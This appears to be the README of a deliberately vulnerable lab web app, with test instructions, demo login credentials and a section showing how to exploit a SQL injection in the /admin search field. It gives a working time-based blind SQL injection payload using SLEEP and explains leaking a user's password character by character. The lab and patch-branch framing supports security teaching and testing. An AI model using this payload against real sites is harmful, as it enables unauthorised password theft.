### Test
Run `make clean && make test` to run the test suite

Tests on master branch should fail on last test

Test should all pass on patch branch

### Setting up site
Run `make run` and visit localhost:5050, use `John Smith` and `johnpw` to login

### Exploiting the vulnerability
Set up the site

Inject sql into the search field on `/admin` - `IF(SUBSTRING(password,1,1) = CHAR(106), SLEEP(5), null)`
Observe abnormal response time
Inject sql into the search field on `/admin` - `IF(SUBSTRING(password,1,1) = CHAR(105), SLEEP(5), null)`
Observe the regular response time

Try with other characters to leak password for the given user
